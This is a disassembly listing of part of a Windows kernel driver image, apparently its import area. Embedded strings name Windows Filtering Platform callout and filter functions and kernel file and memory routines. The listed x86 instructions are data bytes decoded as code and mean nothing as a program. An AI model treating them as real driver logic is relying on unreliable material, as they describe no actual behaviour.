  4120b4:	00 00                	add    %al,(%eax)
  4120b6:	00 00                	add    %al,(%eax)
  4120b8:	8a 2a                	mov    (%edx),%ch
  4120ba:	01 00                	add    %eax,(%eax)
  4120bc:	72 2a                	jb     0x4120e8
  4120be:	01 00                	add    %eax,(%eax)
  4120c0:	5a                   	pop    %edx
  4120c1:	2a 01                	sub    (%ecx),%al
  4120c3:	00 4c 2a 01          	add    %cl,0x1(%edx,%ebp,1)
  4120c7:	00 00                	add    %al,(%eax)
  4120c9:	00 00                	add    %al,(%eax)
  4120cb:	00 fc                	add    %bh,%ah
  4120cd:	2a 01                	sub    (%ecx),%al
  4120cf:	00 0e                	add    %cl,(%esi)
  4120d1:	2b 01                	sub    (%ecx),%eax
  4120d3:	00 24 2b             	add    %ah,(%ebx,%ebp,1)
  4120d6:	01 00                	add    %eax,(%eax)
  4120d8:	e8 2a 01 00 00       	call   0x412207
  4120dd:	00 00                	add    %al,(%eax)
  4120df:	00 8e 23 01 00 ac    	add    %cl,-0x53fffedd(%esi)
  4120e5:	23 01                	and    (%ecx),%eax
  4120e7:	00 76 23             	add    %dh,0x23(%esi)
  4120ea:	01 00                	add    %eax,(%eax)
  4120ec:	e2 23                	loop   0x412111
  4120ee:	01 00                	add    %eax,(%eax)
  4120f0:	0a 24 01             	or     (%ecx,%eax,1),%ah
  4120f3:	00 64 23 01          	add    %ah,0x1(%ebx,%eiz,1)
  4120f7:	00 52 23             	add    %dl,0x23(%edx)
  4120fa:	01 00                	add    %eax,(%eax)
  4120fc:	36 23 01             	and    %ss:(%ecx),%eax
  4120ff:	00 22                	add    %ah,(%edx)
  412101:	23 01                	and    (%ecx),%eax
  412103:	00 0a                	add    %cl,(%edx)
  412105:	23 01                	and    (%ecx),%eax
  412107:	00 f0                	add    %dh,%al
  412109:	22 01                	and    (%ecx),%al
  41210b:	00 d8                	add    %bl,%al
  41210d:	22 01                	and    (%ecx),%al
  41210f:	00 c4                	add    %al,%ah
  412111:	22 01                	and    (%ecx),%al
  412113:	00 b2 22 01 00 94    	add    %dh,-0x6bfffede(%edx)
  412119:	22 01                	and    (%ecx),%al
  41211b:	00 ca                	add    %cl,%dl
  41211d:	23 01                	and    (%ecx),%eax
  41211f:	00 7c 22 01          	add    %bh,0x1(%edx,%eiz,1)
  412123:	00 00                	add    %al,(%eax)
  412125:	00 00                	add    %al,(%eax)
  412127:	00 10                	add    %dl,(%eax)
  412129:	25 01 00 20 25       	and    $0x25200001,%eax
  41212e:	01 00                	add    %eax,(%eax)
  412130:	30 25 01 00 3c 25    	xor    %ah,0x253c0001
  412136:	01 00                	add    %eax,(%eax)
  412138:	58                   	pop    %eax
  412139:	25 01 00 74 25       	and    $0x25740001,%eax
  41213e:	01 00                	add    %eax,(%eax)
  412140:	8c 25 01 00 a6 25    	mov    %fs,0x25a60001
  412146:	01 00                	add    %eax,(%eax)
  412148:	be 25 01 00 cc       	mov    $0xcc000125,%esi
  41214d:	25 01 00 da 25       	and    $0x25da0001,%eax
  412152:	01 00                	add    %eax,(%eax)
  412154:	e4 25                	in     $0x25,%al
  412156:	01 00                	add    %eax,(%eax)
  412158:	f8                   	clc
  412159:	25 01 00 10 26       	and    $0x26100001,%eax
  41215e:	01 00                	add    %eax,(%eax)
  412160:	28 26                	sub    %ah,(%esi)
  412162:	01 00                	add    %eax,(%eax)
  412164:	42                   	inc    %edx
  412165:	26 01 00             	add    %eax,%es:(%eax)
  412168:	5c                   	pop    %esp
  412169:	26 01 00             	add    %eax,%es:(%eax)
  41216c:	66 26 01 00          	add    %ax,%es:(%eax)
  412170:	7e 26                	jle    0x412198
  412172:	01 00                	add    %eax,(%eax)
  412174:	96                   	xchg   %eax,%esi
  412175:	26 01 00             	add    %eax,%es:(%eax)
  412178:	b2 26                	mov    $0x26,%dl
  41217a:	01 00                	add    %eax,(%eax)
  41217c:	c6                   	(bad)
  41217d:	26 01 00             	add    %eax,%es:(%eax)
  412180:	d0 26                	shlb   $1,(%esi)
  412182:	01 00                	add    %eax,(%eax)
  412184:	da 26                	fisubl (%esi)
  412186:	01 00                	add    %eax,(%eax)
  412188:	e4 26                	in     $0x26,%al
  41218a:	01 00                	add    %eax,(%eax)
  41218c:	ee                   	out    %al,(%dx)
  41218d:	26 01 00             	add    %eax,%es:(%eax)
  412190:	f8                   	clc
  412191:	26 01 00             	add    %eax,%es:(%eax)
  412194:	02 27                	add    (%edi),%ah
  412196:	01 00                	add    %eax,(%eax)
  412198:	16                   	push   %ss
  412199:	27                   	daa
  41219a:	01 00                	add    %eax,(%eax)
  41219c:	20 27                	and    %ah,(%edi)
  41219e:	01 00                	add    %eax,(%eax)
  4121a0:	2a 27                	sub    (%edi),%ah
  4121a2:	01 00                	add    %eax,(%eax)
  4121a4:	e8 24 01 00 3e       	call   0x3e4122cd
  4121a9:	27                   	daa
  4121aa:	01 00                	add    %eax,(%eax)
  4121ac:	5c                   	pop    %esp
  4121ad:	27                   	daa
  4121ae:	01 00                	add    %eax,(%eax)
  4121b0:	7a 27                	jp     0x4121d9
  4121b2:	01 00                	add    %eax,(%eax)
  4121b4:	84 27                	test   %ah,(%edi)
  4121b6:	01 00                	add    %eax,(%eax)
  4121b8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4121b9:	27                   	daa
  4121ba:	01 00                	add    %eax,(%eax)
  4121bc:	bc 27 01 00 da       	mov    $0xda000127,%esp
  4121c1:	27                   	daa
  4121c2:	01 00                	add    %eax,(%eax)
  4121c4:	fa                   	cli
  4121c5:	27                   	daa
  4121c6:	01 00                	add    %eax,(%eax)
  4121c8:	0a 28                	or     (%eax),%ch
  4121ca:	01 00                	add    %eax,(%eax)
  4121cc:	20 28                	and    %ch,(%eax)
  4121ce:	01 00                	add    %eax,(%eax)
  4121d0:	30 28                	xor    %ch,(%eax)
  4121d2:	01 00                	add    %eax,(%eax)
  4121d4:	48                   	dec    %eax
  4121d5:	28 01                	sub    %al,(%ecx)
  4121d7:	00 56 28             	add    %dl,0x28(%esi)
  4121da:	01 00                	add    %eax,(%eax)
  4121dc:	62 28                	bound  %ebp,(%eax)
  4121de:	01 00                	add    %eax,(%eax)
  4121e0:	70 28                	jo     0x41220a
  4121e2:	01 00                	add    %eax,(%eax)
  4121e4:	82 28 01             	subb   $0x1,(%eax)
  4121e7:	00 92 28 01 00 ac    	add    %dl,-0x53fffed8(%edx)
  4121ed:	28 01                	sub    %al,(%ecx)
  4121ef:	00 bc 28 01 00 dc 28 	add    %bh,0x28dc0001(%eax,%ebp,1)
  4121f6:	01 00                	add    %eax,(%eax)
  4121f8:	ec                   	in     (%dx),%al
  4121f9:	28 01                	sub    %al,(%ecx)
  4121fb:	00 06                	add    %al,(%esi)
  4121fd:	29 01                	sub    %eax,(%ecx)
  4121ff:	00 26                	add    %ah,(%esi)
  412201:	29 01                	sub    %eax,(%ecx)
  412203:	00 44 29 01          	add    %al,0x1(%ecx,%ebp,1)
  412207:	00 5c 29 01          	add    %bl,0x1(%ecx,%ebp,1)
  41220b:	00 74 29 01          	add    %dh,0x1(%ecx,%ebp,1)
  41220f:	00 8a 29 01 00 a6    	add    %cl,-0x59fffed7(%edx)
  412215:	29 01                	sub    %eax,(%ecx)
  412217:	00 b0 29 01 00 c0    	add    %dh,-0x3ffffed7(%eax)
  41221d:	29 01                	sub    %eax,(%ecx)
  41221f:	00 cc                	add    %cl,%ah
  412221:	29 01                	sub    %eax,(%ecx)
  412223:	00 d6                	add    %dl,%dh
  412225:	29 01                	sub    %eax,(%ecx)
  412227:	00 e2                	add    %ah,%dl
  412229:	29 01                	sub    %eax,(%ecx)
  41222b:	00 f8                	add    %bh,%al
  41222d:	29 01                	sub    %eax,(%ecx)
  41222f:	00 08                	add    %cl,(%eax)
  412231:	2a 01                	sub    (%ecx),%al
  412233:	00 18                	add    %bl,(%eax)
  412235:	2a 01                	sub    (%ecx),%al
  412237:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  41223a:	01 00                	add    %eax,(%eax)
  41223c:	00 25 01 00 40 2a    	add    %ah,0x2a400001
  412242:	01 00                	add    %eax,(%eax)
  412244:	d0 24 01             	shlb   $1,(%ecx,%eax,1)
  412247:	00 c2                	add    %al,%dl
  412249:	24 01                	and    $0x1,%al
  41224b:	00 ae 24 01 00 98    	add    %ch,-0x67fffedc(%esi)
  412251:	24 01                	and    $0x1,%al
  412253:	00 80 24 01 00 a4    	add    %al,-0x5bfffedc(%eax)
  412259:	2a 01                	sub    (%ecx),%al
  41225b:	00 6c 24 01          	add    %ch,0x1(%esp)
  41225f:	00 54 24 01          	add    %dl,0x1(%esp)
  412263:	00 d0                	add    %dl,%al
  412265:	2a 01                	sub    (%ecx),%al
  412267:	00 4a 24             	add    %cl,0x24(%edx)
  41226a:	01 00                	add    %eax,(%eax)
  41226c:	40                   	inc    %eax
  41226d:	24 01                	and    $0x1,%al
  41226f:	00 36                	add    %dh,(%esi)
  412271:	24 01                	and    $0x1,%al
  412273:	00 34 27             	add    %dh,(%edi,%eiz,1)
  412276:	01 00                	add    %eax,(%eax)
  412278:	00 00                	add    %al,(%eax)
  41227a:	00 00                	add    %al,(%eax)
  41227c:	a3 00 46 77 70       	mov    %eax,0x70774600
  412281:	73 43                	jae    0x4122c6
  412283:	61                   	popa
  412284:	6c                   	insb   (%dx),%es:(%edi)
  412285:	6c                   	insb   (%dx),%es:(%edi)
  412286:	6f                   	outsl  %ds:(%esi),(%dx)
  412287:	75 74                	jne    0x4122fd
  412289:	52                   	push   %edx
  41228a:	65 67 69 73 74 65 72 	imul   $0x317265,%gs:0x74(%bp,%di),%esi
  412291:	31 00 
  412293:	00 a7 00 46 77 70    	add    %ah,0x70774600(%edi)
  412299:	73 43                	jae    0x4122de
  41229b:	61                   	popa
  41229c:	6c                   	insb   (%dx),%es:(%edi)
  41229d:	6c                   	insb   (%dx),%es:(%edi)
  41229e:	6f                   	outsl  %ds:(%esi),(%dx)
  41229f:	75 74                	jne    0x412315
  4122a1:	55                   	push   %ebp
  4122a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4122a3:	72 65                	jb     0x41230a
  4122a5:	67 69 73 74 65 72 42 	imul   $0x79427265,0x74(%bp,%di),%esi
  4122ac:	79 
  4122ad:	49                   	dec    %ecx
  4122ae:	64 30 00             	xor    %al,%fs:(%eax)
  4122b1:	00 2d 00 46 77 70    	add    %ch,0x70774600
  4122b7:	6d                   	insl   (%dx),%es:(%edi)
  4122b8:	45                   	inc    %ebp
  4122b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4122ba:	67 69 6e 65 4f 70 65 	imul   $0x6e65704f,0x65(%bp),%ebp
  4122c1:	6e 
  4122c2:	30 00                	xor    %al,(%eax)
  4122c4:	2a 00                	sub    (%eax),%al
  4122c6:	46                   	inc    %esi
  4122c7:	77 70                	ja     0x412339
  4122c9:	6d                   	insl   (%dx),%es:(%edi)
  4122ca:	45                   	inc    %ebp
  4122cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4122cc:	67 69 6e 65 43 6c 6f 	imul   $0x736f6c43,0x65(%bp),%ebp
  4122d3:	73 
  4122d4:	65 30 00             	xor    %al,%gs:(%eax)
  4122d7:	00 76 00             	add    %dh,0x0(%esi)
  4122da:	46                   	inc    %esi
  4122db:	77 70                	ja     0x41234d
  4122dd:	6d                   	insl   (%dx),%es:(%edi)
  4122de:	54                   	push   %esp
  4122df:	72 61                	jb     0x412342
  4122e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4122e2:	73 61                	jae    0x412345
  4122e4:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  4122e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4122e9:	42                   	inc    %edx
  4122ea:	65 67 69 6e 30 00 77 	imul   $0x46007700,%gs:0x30(%bp),%ebp
  4122f1:	00 46 
  4122f3:	77 70                	ja     0x412365
  4122f5:	6d                   	insl   (%dx),%es:(%edi)
  4122f6:	54                   	push   %esp
  4122f7:	72 61                	jb     0x41235a
  4122f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4122fa:	73 61                	jae    0x41235d
  4122fc:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  412300:	6e                   	outsb  %ds:(%esi),(%dx)
  412301:	43                   	inc    %ebx
  412302:	6f                   	outsl  %ds:(%esi),(%dx)
  412303:	6d                   	insl   (%dx),%es:(%edi)
  412304:	6d                   	insl   (%dx),%es:(%edi)
  412305:	69 74 30 00 00 75 00 	imul   $0x46007500,0x0(%eax,%esi,1),%esi
  41230c:	46 
  41230d:	77 70                	ja     0x41237f
  41230f:	6d                   	insl   (%dx),%es:(%edi)
  412310:	54                   	push   %esp
  412311:	72 61                	jb     0x412374
  412313:	6e                   	outsb  %ds:(%esi),(%dx)
  412314:	73 61                	jae    0x412377
  412316:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  41231a:	6e                   	outsb  %ds:(%esi),(%dx)
  41231b:	41                   	inc    %ecx
  41231c:	62 6f 72             	bound  %ebp,0x72(%edi)
  41231f:	74 30                	je     0x412351
  412321:	00 6d 00             	add    %ch,0x0(%ebp)
  412324:	46                   	inc    %esi
  412325:	77 70                	ja     0x412397
  412327:	6d                   	insl   (%dx),%es:(%edi)
  412328:	53                   	push   %ebx
  412329:	75 62                	jne    0x41238d
  41232b:	4c                   	dec    %esp
  41232c:	61                   	popa
  41232d:	79 65                	jns    0x412394
  41232f:	72 41                	jb     0x412372
  412331:	64 64 30 00          	fs xor %al,%fs:(%eax)
  412335:	00 6f 00             	add    %ch,0x0(%edi)
  412338:	46                   	inc    %esi
  412339:	77 70                	ja     0x4123ab
  41233b:	6d                   	insl   (%dx),%es:(%edi)
  41233c:	53                   	push   %ebx
  41233d:	75 62                	jne    0x4123a1
  41233f:	4c                   	dec    %esp
  412340:	61                   	popa
  412341:	79 65                	jns    0x4123a8
  412343:	72 44                	jb     0x412389
  412345:	65 6c                	gs insb (%dx),%es:(%edi)
  412347:	65 74 65             	gs je  0x4123af
  41234a:	42                   	inc    %edx
  41234b:	79 4b                	jns    0x412398
  41234d:	65 79 30             	gs jns 0x412380
  412350:	00 00                	add    %al,(%eax)
  412352:	19 00                	sbb    %eax,(%eax)
  412354:	46                   	inc    %esi
  412355:	77 70                	ja     0x4123c7
  412357:	6d                   	insl   (%dx),%es:(%edi)
  412358:	43                   	inc    %ebx
  412359:	61                   	popa
  41235a:	6c                   	insb   (%dx),%es:(%edi)
  41235b:	6c                   	insb   (%dx),%es:(%edi)
  41235c:	6f                   	outsl  %ds:(%esi),(%dx)
  41235d:	75 74                	jne    0x4123d3
  41235f:	41                   	inc    %ecx
  412360:	64 64 30 00          	fs xor %al,%fs:(%eax)
  412364:	30 00                	xor    %al,(%eax)
  412366:	46                   	inc    %esi
  412367:	77 70                	ja     0x4123d9
  412369:	6d                   	insl   (%dx),%es:(%edi)
  41236a:	46                   	inc    %esi
  41236b:	69 6c 74 65 72 41 64 	imul   $0x64644172,0x65(%esp,%esi,2),%ebp
  412372:	64 
  412373:	30 00                	xor    %al,(%eax)
  412375:	00 32                	add    %dh,(%edx)
  412377:	00 46 77             	add    %al,0x77(%esi)
  41237a:	70 6d                	jo     0x4123e9
  41237c:	46                   	inc    %esi
  41237d:	69 6c 74 65 72 44 65 	imul   $0x6c654472,0x65(%esp,%esi,2),%ebp
  412384:	6c 
  412385:	65 74 65             	gs je  0x4123ed
  412388:	42                   	inc    %edx
  412389:	79 49                	jns    0x4123d4
  41238b:	64 30 00             	xor    %al,%fs:(%eax)
  41238e:	96                   	xchg   %eax,%esi
  41238f:	00 46 77             	add    %al,0x77(%esi)
  412392:	70 73                	jo     0x412407
  412394:	41                   	inc    %ecx
  412395:	63 71 75             	arpl   %esi,0x75(%ecx)
  412398:	69 72 65 43 6c 61 73 	imul   $0x73616c43,0x65(%edx),%esi
  41239f:	73 69                	jae    0x41240a
  4123a1:	66 79 48             	data16 jns 0x4123ec
  4123a4:	61                   	popa
  4123a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4123a6:	64 6c                	fs insb (%dx),%es:(%edi)
  4123a8:	65 30 00             	xor    %al,%gs:(%eax)
  4123ab:	00 e0                	add    %ah,%al
  4123ad:	00 46 77             	add    %al,0x77(%esi)
  4123b0:	70 73                	jo     0x412425
  4123b2:	52                   	push   %edx
  4123b3:	65 6c                	gs insb (%dx),%es:(%edi)
  4123b5:	65 61                	gs popa
  4123b7:	73 65                	jae    0x41241e
  4123b9:	43                   	inc    %ebx
  4123ba:	6c                   	insb   (%dx),%es:(%edi)
  4123bb:	61                   	popa
  4123bc:	73 73                	jae    0x412431
  4123be:	69 66 79 48 61 6e 64 	imul   $0x646e6148,0x79(%esi),%esp
  4123c5:	6c                   	insb   (%dx),%es:(%edi)
  4123c6:	65 30 00             	xor    %al,%gs:(%eax)
  4123c9:	00 ac 00 46 77 70 73 	add    %ch,0x73707746(%eax,%eax,1)
  4123d0:	43                   	inc    %ebx
  4123d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4123d2:	6d                   	insl   (%dx),%es:(%edi)
  4123d3:	70 6c                	jo     0x412441
  4123d5:	65 74 65             	gs je  0x41243d
  4123d8:	43                   	inc    %ebx
  4123d9:	6c                   	insb   (%dx),%es:(%edi)
  4123da:	61                   	popa
  4123db:	73 73                	jae    0x412450
  4123dd:	69 66 79 30 00 97 00 	imul   $0x970030,0x79(%esi),%esp
  4123e4:	46                   	inc    %esi
  4123e5:	77 70                	ja     0x412457
  4123e7:	73 41                	jae    0x41242a
  4123e9:	63 71 75             	arpl   %esi,0x75(%ecx)
  4123ec:	69 72 65 57 72 69 74 	imul   $0x74697257,0x65(%edx),%esi
  4123f3:	61                   	popa
  4123f4:	62 6c 65 4c          	bound  %ebp,0x4c(%ebp,%eiz,2)
  4123f8:	61                   	popa
  4123f9:	79 65                	jns    0x412460
  4123fb:	72 44                	jb     0x412441
  4123fd:	61                   	popa
  4123fe:	74 61                	je     0x412461
  412400:	50                   	push   %eax
  412401:	6f                   	outsl  %ds:(%esi),(%dx)
  412402:	69 6e 74 65 72 30 00 	imul   $0x307265,0x74(%esi),%ebp
  412409:	00 a1 00 46 77 70    	add    %ah,0x70774600(%ecx)
  41240f:	73 41                	jae    0x412452
  412411:	70 70                	jo     0x412483
  412413:	6c                   	insb   (%dx),%es:(%edi)
  412414:	79 4d                	jns    0x412463
  412416:	6f                   	outsl  %ds:(%esi),(%dx)
  412417:	64 69 66 69 65 64 4c 	imul   $0x614c6465,%fs:0x69(%esi),%esp
  41241e:	61 
  41241f:	79 65                	jns    0x412486
  412421:	72 44                	jb     0x412467
  412423:	61                   	popa
  412424:	74 61                	je     0x412487
  412426:	30 00                	xor    %al,(%eax)
  412428:	66 77 70             	data16 ja 0x41249b
  41242b:	6b 63 6c 6e          	imul   $0x6e,0x6c(%ebx),%esp
  41242f:	74 2e                	je     0x41245f
  412431:	73 79                	jae    0x4124ac
  412433:	73 00                	jae    0x412435
  412435:	00 86 0b 6d 65 6d    	add    %al,0x6d656d0b(%esi)
  41243b:	63 70 79             	arpl   %esi,0x79(%eax)
  41243e:	00 00                	add    %al,(%eax)
  412440:	8a 0b                	mov    (%ebx),%cl
  412442:	6d                   	insl   (%dx),%es:(%edi)
  412443:	65 6d                	gs insl (%dx),%es:(%edi)
  412445:	73 65                	jae    0x4124ac
  412447:	74 00                	je     0x412449
  412449:	00 97 0b 73 74 72    	add    %dl,0x7274730b(%edi)
  41244f:	63 70 79             	arpl   %esi,0x79(%eax)
  412452:	00 00                	add    %al,(%eax)
  412454:	4c                   	dec    %esp
  412455:	08 52 74             	or     %dl,0x74(%edx)
  412458:	6c                   	insb   (%dx),%es:(%edi)
  412459:	49                   	dec    %ecx
  41245a:	6e                   	outsb  %ds:(%esi),(%dx)
  41245b:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%ebp,%edx,2),%esi
  412462:	64 
  412463:	65 53                	gs push %ebx
  412465:	74 72                	je     0x4124d9
  412467:	69 6e 67 00 00 cb 00 	imul   $0xcb0000,0x67(%esi),%ebp
  41246e:	45                   	inc    %ebp
  41246f:	78 46                	js     0x4124b7
  412471:	72 65                	jb     0x4124d8
  412473:	65 50                	gs push %eax
  412475:	6f                   	outsl  %ds:(%esi),(%dx)
  412476:	6f                   	outsl  %ds:(%esi),(%dx)
  412477:	6c                   	insb   (%dx),%es:(%edi)
  412478:	57                   	push   %edi
  412479:	69 74 68 54 61 67 00 	imul   $0xd6006761,0x54(%eax,%ebp,2),%esi
  412480:	d6 
  412481:	02 49 6f             	add    0x6f(%ecx),%cl
  412484:	44                   	inc    %esp
  412485:	65 6c                	gs insb (%dx),%es:(%edi)
  412487:	65 74 65             	gs je  0x4124ef
  41248a:	53                   	push   %ebx
  41248b:	79 6d                	jns    0x4124fa
  41248d:	62 6f 6c             	bound  %ebp,0x6c(%edi)
  412490:	69 63 4c 69 6e 6b 00 	imul   $0x6b6e69,0x4c(%ebx),%esp
  412497:	00 39                	add    %bh,(%ecx)
  412499:	04 4b                	add    $0x4b,%al
  41249b:	65 47                	gs inc %edi
  41249d:	65 74 43             	gs je  0x4124e3
  4124a0:	75 72                	jne    0x412514
  4124a2:	72 65                	jb     0x412509
  4124a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4124a5:	74 54                	je     0x4124fb
  4124a7:	68 72 65 61 64       	push   $0x64616572
  4124ac:	00 00                	add    %al,(%eax)
  4124ae:	4b                   	dec    %ebx
  4124af:	04 4b                	add    $0x4b,%al
  4124b1:	65 49                	gs dec %ecx
  4124b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4124b4:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4124bb:	65 
  4124bc:	45                   	inc    %ebp
  4124bd:	76 65                	jbe    0x412524
  4124bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4124c0:	74 00                	je     0x4124c2
  4124c2:	cb                   	lret
  4124c3:	04 4b                	add    $0x4b,%al
  4124c5:	65 53                	gs push %ebx
  4124c7:	65 74 45             	gs je  0x41250f
  4124ca:	76 65                	jbe    0x412531
  4124cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4124cd:	74 00                	je     0x4124cf
  4124cf:	00 f4                	add    %dh,%ah
  4124d1:	04 4b                	add    $0x4b,%al
  4124d3:	65 57                	gs push %edi
  4124d5:	61                   	popa
  4124d6:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
  4124dd:	6e 
  4124de:	67 6c                	insb   (%dx),%es:(%di)
  4124e0:	65 4f                	gs dec %edi
  4124e2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4124e5:	63 74 00 a4          	arpl   %esi,-0x5c(%eax,%eax,1)
  4124e9:	00 45 78             	add    %al,0x78(%ebp)
  4124ec:	41                   	inc    %ecx
  4124ed:	6c                   	insb   (%dx),%es:(%edi)
  4124ee:	6c                   	insb   (%dx),%es:(%edi)
  4124ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4124f0:	63 61 74             	arpl   %esp,0x74(%ecx)
  4124f3:	65 50                	gs push %eax
  4124f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4124f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4124f7:	6c                   	insb   (%dx),%es:(%edi)
  4124f8:	57                   	push   %edi
  4124f9:	69 74 68 54 61 67 00 	imul   $0x92006761,0x54(%eax,%ebp,2),%esi
  412500:	92 
  412501:	02 49 6f             	add    0x6f(%ecx),%cl
  412504:	41                   	inc    %ecx
  412505:	6c                   	insb   (%dx),%es:(%edi)
  412506:	6c                   	insb   (%dx),%es:(%edi)
  412507:	6f                   	outsl  %ds:(%esi),(%dx)
  412508:	63 61 74             	arpl   %esp,0x74(%ecx)
  41250b:	65 49                	gs dec %ecx
  41250d:	72 70                	jb     0x41257f
  41250f:	00 d5                	add    %dl,%ch
  412511:	03 49 6f             	add    0x6f(%ecx),%ecx
  412514:	66 43                	inc    %bx
  412516:	61                   	popa
  412517:	6c                   	insb   (%dx),%es:(%edi)
  412518:	6c                   	insb   (%dx),%es:(%edi)
  412519:	44                   	inc    %esp
  41251a:	72 69                	jb     0x412585
  41251c:	76 65                	jbe    0x412583
  41251e:	72 00                	jb     0x412520
  412520:	c0 02 49             	rolb   $0x49,(%edx)
  412523:	6f                   	outsl  %ds:(%esi),(%dx)
  412524:	43                   	inc    %ebx
  412525:	72 65                	jb     0x41258c
  412527:	61                   	popa
  412528:	74 65                	je     0x41258f
  41252a:	46                   	inc    %esi
  41252b:	69 6c 65 00 00 e8 02 	imul   $0x4902e800,0x0(%ebp,%eiz,2),%ebp
  412532:	49 
  412533:	6f                   	outsl  %ds:(%esi),(%dx)
  412534:	46                   	inc    %esi
  412535:	72 65                	jb     0x41259c
  412537:	65 49                	gs dec %ecx
  412539:	72 70                	jb     0x4125ab
  41253b:	00 16                	add    %dl,(%esi)
  41253d:	03 49 6f             	add    0x6f(%ecx),%ecx
  412540:	47                   	inc    %edi
  412541:	65 74 52             	gs je  0x412596
  412544:	65 6c                	gs insb (%dx),%es:(%edi)
  412546:	61                   	popa
  412547:	74 65                	je     0x4125ae
  412549:	64 44                	fs inc %esp
  41254b:	65 76 69             	gs jbe 0x4125b7
  41254e:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  412551:	62 6a 65             	bound  %ebp,0x65(%edx)
  412554:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  412558:	37                   	aaa
  412559:	06                   	push   %es
  41255a:	4f                   	dec    %edi
  41255b:	62 52 65             	bound  %edx,0x65(%edx)
  41255e:	66 65 72 65          	data16 gs jb 0x4125c7
  412562:	6e                   	outsb  %ds:(%esi),(%dx)
  412563:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  412566:	62 6a 65             	bound  %ebp,0x65(%edx)
  412569:	63 74 42 79          	arpl   %esi,0x79(%edx,%eax,2)
  41256d:	48                   	dec    %eax
  41256e:	61                   	popa
  41256f:	6e                   	outsb  %ds:(%esi),(%dx)
  412570:	64 6c                	fs insb (%dx),%es:(%edi)
  412572:	65 00 47 06          	add    %al,%gs:0x6(%edi)
  412576:	4f                   	dec    %edi
  412577:	62 66 44             	bound  %esp,0x44(%esi)
  41257a:	65 72 65             	gs jb  0x4125e2
  41257d:	66 65 72 65          	data16 gs jb 0x4125e6
  412581:	6e                   	outsb  %ds:(%esi),(%dx)
  412582:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  412585:	62 6a 65             	bound  %ebp,0x65(%edx)
  412588:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  41258c:	c8 0a 5a 77          	enter  $0x5a0a,$0x77
  412590:	51                   	push   %ecx
  412591:	75 65                	jne    0x4125f8
  412593:	72 79                	jb     0x41260e
  412595:	49                   	dec    %ecx
  412596:	6e                   	outsb  %ds:(%esi),(%dx)
  412597:	66 6f                	outsw  %ds:(%esi),(%dx)
  412599:	72 6d                	jb     0x412608
  41259b:	61                   	popa
  41259c:	74 69                	je     0x412607
  41259e:	6f                   	outsl  %ds:(%esi),(%dx)
  41259f:	6e                   	outsb  %ds:(%esi),(%dx)
  4125a0:	46                   	inc    %esi
  4125a1:	69 6c 65 00 00 01 0b 	imul   $0x5a0b0100,0x0(%ebp,%eiz,2),%ebp
  4125a8:	5a 
  4125a9:	77 53                	ja     0x4125fe
  4125ab:	65 74 49             	gs je  0x4125f7
  4125ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4125af:	66 6f                	outsw  %ds:(%esi),(%dx)
  4125b1:	72 6d                	jb     0x412620
  4125b3:	61                   	popa
  4125b4:	74 69                	je     0x41261f
  4125b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4125b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4125b8:	46                   	inc    %esi
  4125b9:	69 6c 65 00 00 e3 0a 	imul   $0x5a0ae300,0x0(%ebp,%eiz,2),%ebp
  4125c0:	5a 
  4125c1:	77 52                	ja     0x412615
  4125c3:	65 61                	gs popa
  4125c5:	64 46                	fs inc %esi
  4125c7:	69 6c 65 00 00 2a 0b 	imul   $0x5a0b2a00,0x0(%ebp,%eiz,2),%ebp
  4125ce:	5a 
  4125cf:	77 57                	ja     0x412628
  4125d1:	72 69                	jb     0x41263c
  4125d3:	74 65                	je     0x41263a
  4125d5:	46                   	inc    %esi
  4125d6:	69 6c 65 00 50 0a 5a 	imul   $0x775a0a50,0x0(%ebp,%eiz,2),%ebp
  4125dd:	77 
  4125de:	43                   	inc    %ebx
  4125df:	6c                   	insb   (%dx),%es:(%edi)
  4125e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4125e1:	73 65                	jae    0x412648
  4125e3:	00 e3                	add    %ah,%bl
  4125e5:	02 49 6f             	add    0x6f(%ecx),%cl
  4125e8:	46                   	inc    %esi
  4125e9:	69 6c 65 4f 62 6a 65 	imul   $0x63656a62,0x4f(%ebp,%eiz,2),%ebp
  4125f0:	63 
  4125f1:	74 54                	je     0x412647
  4125f3:	79 70                	jns    0x412665
  4125f5:	65 00 00             	add    %al,%gs:(%eax)
  4125f8:	22 04 4b             	and    (%ebx,%ecx,2),%al
  4125fb:	65 45                	gs inc %ebp
  4125fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4125fe:	74 65                	je     0x412665
  412600:	72 43                	jb     0x412645
  412602:	72 69                	jb     0x41266d
  412604:	74 69                	je     0x41266f
  412606:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  412609:	52                   	push   %edx
  41260a:	65 67 69 6f 6e 00 6c 	imul   $0x4b046c00,%gs:0x6e(%bx),%ebp
  412611:	04 4b 
  412613:	65 4c                	gs dec %esp
  412615:	65 61                	gs popa
